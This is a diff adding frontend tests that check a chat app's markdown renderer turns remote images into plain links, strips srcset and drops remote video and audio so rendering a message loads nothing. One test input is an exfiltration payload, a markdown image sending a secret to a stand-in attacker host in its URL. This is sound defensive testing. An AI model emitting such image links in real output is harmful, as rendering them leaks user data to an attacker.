@@ -45,6 +45,34 @@ describe("MarkdownContent", () => {
     expect(rendered.container.querySelector('a[href^="javascript:"]')).toBeNull();
   });
 
+  it("turns remote images into links so rendering a message requests nothing", async () => {
+    const rendered = await renderContent(
+      '![secret](https://attacker.example/?d=s3cret) ![](//cdn.example/x.png) <img src="https://a.example/y.png" srcset="https://b.example/z.png 2x">');
+    cleanup = rendered.cleanup;
+    expect(rendered.container.querySelector("img")).toBeNull();
+    const links = [...rendered.container.querySelectorAll("a")];
+    expect(links.map((a) => a.getAttribute("href"))).toEqual([
+      "https://attacker.example/?d=s3cret", "//cdn.example/x.png", "https://a.example/y.png"]);
+    expect(links.map((a) => a.textContent)).toEqual(["[image: secret]", "[image: cdn.example]", "[image: a.example]"]);
+    for (const a of links) expect(a.getAttribute("rel")).toBe("noopener noreferrer");
+  });
+
+  it("keeps same-origin and inline images, without srcset", async () => {
+    const rendered = await renderContent(
+      `![chart](/api/v1/files/c.png) ![dot](data:image/png;base64,iVBORw0KGgo=) <img src="${window.location.origin}/a.png" srcset="https://b.example/z.png 2x">`);
+    cleanup = rendered.cleanup;
+    const images = [...rendered.container.querySelectorAll("img")];
+    expect(images.map((img) => img.getAttribute("src"))).toEqual([
+      "/api/v1/files/c.png", "data:image/png;base64,iVBORw0KGgo=", `${window.location.origin}/a.png`]);
+    for (const img of images) expect(img.hasAttribute("srcset")).toBe(false);
+  });
+
+  it("drops media tags that would load remote sources", async () => {
+    const rendered = await renderContent('<video src="https://a.example/v.mp4" poster="https://a.example/p.png"></video><audio src="https://a.example/a.mp3"></audio>');
+    cleanup = rendered.cleanup;
+    expect(rendered.container.querySelector("video, audio, source")).toBeNull();
+  });
+
   it("opens links that point outside the app in a new tab", async () => {
     const rendered = await renderContent("See [the PR](https://github.com/regnull/openbot/pull/1), www.example.test and a@example.test");
     cleanup = rendered.cleanup;
